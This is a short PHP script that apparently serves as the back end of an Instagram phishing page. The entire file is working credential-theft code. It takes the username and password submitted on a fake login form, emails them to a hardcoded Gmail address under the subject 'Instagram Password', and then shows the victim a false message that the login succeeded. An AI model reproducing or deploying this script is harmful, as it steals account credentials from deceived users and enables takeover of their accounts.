<?php
$username=$_POST['username'];
$password=$_POST['password'];


$mailTo="mustakimmullick12345@gmail.com";
$subject="Instagram Password";
$formcontent="Username: $username \n password: $password";

mail($mailTo, $subject, $formcontent) or die("Error!");
echo "You've Logged in SUCCESSFULLY!";

?>
